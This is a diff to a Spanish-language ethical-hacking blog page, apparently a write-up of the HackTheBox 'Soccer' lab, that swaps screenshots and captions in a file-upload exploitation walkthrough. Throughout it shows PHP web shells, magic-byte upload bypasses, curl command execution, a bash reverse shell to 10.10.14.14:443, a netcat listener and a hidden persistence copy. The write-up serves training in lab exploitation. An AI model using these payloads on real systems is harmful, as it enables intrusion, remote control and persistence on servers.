@@ -321,14 +321,11 @@ view-source: # Revisar JavaScript de validación
 # Interceptar con Burp Suite
 burpsuite -> HTTP History -> Analizar POST requests</code>
                     </div>
-                    <div class="image-showcase">
-                        <div class="image-container">
-                            <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/01/image-12.png" alt="Vulnerable file upload form">
-                            <div class="image-caption">
-                                🎯 <strong>Formulario Upload Vulnerable:</strong> Identificación de formulario de subida de archivos con validaciones débiles del lado del cliente. Se observa la interfaz web que permite upload de archivos al directorio /uploads/ con restricciones fácilmente evadibles.
-                            </div>
-                        </div>
-                    </div>
+
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-5.png" alt="Formulario upload HTB Soccer" style="border-radius: 8px; border: 1px solid var(--border-color);">
+                        <figcaption>🎯 <strong>Formulario Upload HTB Soccer:</strong> Interfaz real de subida de archivos PHP en la máquina Soccer (10.10.11.194). Se observa el formulario web vulnerable que permite upload de archivos sin validaciones adecuadas.</figcaption>
+                    </figure>
 
                     <div class="alert alert-info">
                         <p>Identificamos formulario de upload que aparentemente <strong>valida extensión client-side</strong> y permite subida a directorio ejecutable <strong>/uploads/</strong>.</p>
@@ -346,7 +343,16 @@ if(isset($_GET['cmd'])) {
     echo "&lt;/pre>";
 }
 ?>
-EOF
+EOF</code>
+                    </div>
+
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-6.png" alt="Creación archivo malicioso PHP" style="border-radius: 8px; border: 1px solid var(--border-color);">
+                        <figcaption>📝 <strong>Creación del Web Shell:</strong> Proceso real de creación del archivo malicioso PHP con reverse shell. Se muestra el comando utilizado para generar la web shell que establecerá conexión con la IP atacante (10.10.14.14) en puerto 443.</figcaption>
+                    </figure>
+
+                    <div class="code-block">
+                        <div class="code-label">Código completo del payload</div>
 
 # Web Shell con interfaz completa
 cat > webshell.php <<'EOF'
@@ -361,6 +367,11 @@ if(isset($_GET['cmd'])) {
 ?>
 EOF</code>
                     </div>
+
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-7.png" alt="Código PHP malicioso completo" style="border-radius: 8px; border: 1px solid var(--border-color);">
+                        <figcaption>⚙️ <strong>Payload PHP Completo:</strong> Visualización del código malicioso PHP que contiene el comando de reverse shell. El script ejecutará "bash -i >& /dev/tcp/10.10.14.14/443 0>&1" para establecer la conexión inversa.</figcaption>
+                    </figure>
 
                     <h4>Fase 3: Técnicas de Bypass Avanzadas</h4>
                     <div class="code-block">
@@ -400,14 +411,6 @@ echo 'GIF89a&lt;?php system($_GET["cmd"]); ?>' > shell.gif
 printf "\\x89PNG\\r\\n\\x1a\\n&lt;?php system(\\$_GET['cmd']); ?>" > shell.png</code>
                     </div>
 
-                    <div class="image-showcase">
-                        <div class="image-container">
-                            <img src="https://i.imgur.com/burp-bypass-upload.png" alt="Burp Suite file upload bypass">
-                            <div class="image-caption">
-                                🔥 <strong>Bypass con Burp Suite:</strong> Interceptación y modificación de la petición de upload usando Burp Suite. Se muestra cómo cambiar la extensión de .php a .php.jpg y modificar el Content-Type para evadir las validaciones del servidor.
-                            </div>
-                        </div>
-                    </div>
 
                     <h4>Fase 4: Upload y Activación</h4>
                     <div class="code-block">
@@ -428,28 +431,17 @@ curl "http://target.com/uploads/shell.php.jpg?cmd=uname -a"
 curl "http://target.com/uploads/shell.php.jpg?cmd=pwd"</code>
                     </div>
 
-                    <div class="image-showcase">
-                        <div class="image-container">
-                            <img src="https://i.imgur.com/upload-success-shell.png" alt="Successful web shell upload">
-                            <div class="image-caption">
-                                ✅ <strong>Upload Exitoso:</strong> Confirmación de la subida exitosa de la web shell con extensión doble (shell.php.jpg). El servidor acepta el archivo y lo almacena en el directorio /uploads/, listo para ser ejecutado como código PHP.
-                            </div>
-                        </div>
-                    </div>
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-8.png" alt="Netcat listener máquina atacante" style="border-radius: 8px; border: 1px solid var(--border-color);">
+                        <figcaption>📋 <strong>Listener Netcat:</strong> Configuración del listener en la máquina atacante (10.10.14.14) en puerto 443 esperando la conexión de reverse shell. Se muestra el comando "nc -nlvp 443" listo para recibir la conexión.</figcaption>
+                    </figure>
+
 
                     <div class="alert alert-warning">
                         <p>Si el servidor procesa archivos <strong>.jpg</strong> como PHP (AddHandler) o permite <strong>double extension</strong>, la shell será ejecutable y tendremos RCE completo.</p>
                     </div>
 
                     <h4>Fase 5: Post-Explotación Sistemática</h4>
-                    <div class="image-showcase">
-                        <div class="image-container">
-                            <img src="https://i.imgur.com/webshell-interface-active.png" alt="Active web shell interface">
-                            <div class="image-caption">
-                                🌐 <strong>Web Shell Activa:</strong> Interfaz web de la shell PHP funcionando correctamente en el navegador. Se muestra la ejecución exitosa de comandos del sistema (whoami, id, ls) confirmando RCE completo en el servidor objetivo.
-                            </div>
-                        </div>
-                    </div>
 
                     <div class="code-block">
                         <div class="code-label">Enumeración y escalación</div>
@@ -470,14 +462,11 @@ curl "http://target.com/uploads/shell.php.jpg?cmd=bash -c 'bash -i >%26 /dev/tcp
 curl "http://target.com/uploads/shell.php.jpg?cmd=cp shell.php.jpg /var/www/html/.hidden.php"</code>
                     </div>
 
-                    <div class="image-showcase">
-                        <div class="image-container">
-                            <img src="https://i.imgur.com/reverse-shell-webshell.png" alt="Reverse shell established from web shell">
-                            <div class="image-caption">
-                                ⚡ <strong>Reverse Shell Activa:</strong> Conexión de reverse shell establecida exitosamente usando la web shell como vector inicial. Se observa acceso completo al terminal del servidor víctima con capacidades de ejecución interactiva de comandos.
-                            </div>
-                        </div>
-                    </div>
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-9.png" alt="Reverse shell exitosa HTB Soccer" style="border-radius: 8px; border: 1px solid var(--border-color);">
+                        <figcaption>⚡ <strong>Reverse Shell Establecida:</strong> Conexión exitosa de reverse shell en HTB Soccer. Se observa el acceso completo al terminal del servidor víctima con capacidades de ejecución interactiva de comandos del sistema.</figcaption>
+                    </figure>
+
 
                     <div class="alert alert-info">
                         <p><strong>Resultado:</strong> RCE completo obtenido, acceso interactivo al servidor mediante reverse shell, capacidad de enumeración del sistema y establecimiento de múltiples puntos de persistencia.</p>
